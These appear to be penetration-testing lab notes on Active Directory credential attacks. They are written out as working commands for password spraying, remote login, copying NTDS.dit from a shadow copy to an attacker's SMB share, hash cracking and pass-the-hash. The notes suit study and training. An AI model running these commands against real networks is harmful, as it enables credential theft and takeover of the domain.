
Dump hashes from NTDS.dit file (need local admin rights)

If a computer is domain joined, it will not reference SAM database.


Create valid AD usernames in a txt file

Automated list generator:
Git clone: https://github.com/urbanadventurer/username-anarchy
```shell-session
./username-anarchy -i /home/ltnbob/names.txt 
```

Launch attack with CrackMapExec
```shell-session
crackmapexec smb 10.129.201.57 -u bwilliamson -p /usr/share/wordlists/fasttrack.txt
```

Connect with Win-RM
```shell-session
evil-winrm -i 10.129.201.57  -u bwilliamson -p 'P@55w0rd!'
```

Check privileges
```shell-session
net localgroup
```

Checking user account privileges including domain
```shell-session
 net user bwilliamson
```

Creating a shadow copy of C:
```shell-session
vssadmin CREATE SHADOW /For=C:
```

Copy NTDS.dit from the VSS
```shell-session
cmd.exe /c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\Windows\NTDS\NTDS.dit c:\NTDS\NTDS.dit
```

Move to SMB share on attack host
```shell-session
cmd.exe /c move C:\NTDS\NTDS.dit \\10.10.15.30\CompData
```

Easier: Using CrackMapExec to capture NTDS.dit
```shell-session
crackmapexec smb 10.129.201.57 -u bwilliamson -p P@55w0rd! --ntds
```

Use hashcat to crack passwords
```shell-session
sudo hashcat -m 1000 64f12cddaa88057e06a81b54e73b949b /usr/share/wordlists/rockyou.txt
```

### Pass-the-Hash
- NTLM authentication protocol

```shell-session
evil-winrm -i 10.129.201.57  -u  Administrator -H "64f12cddaa88057e06a81b54e73b949b"
```

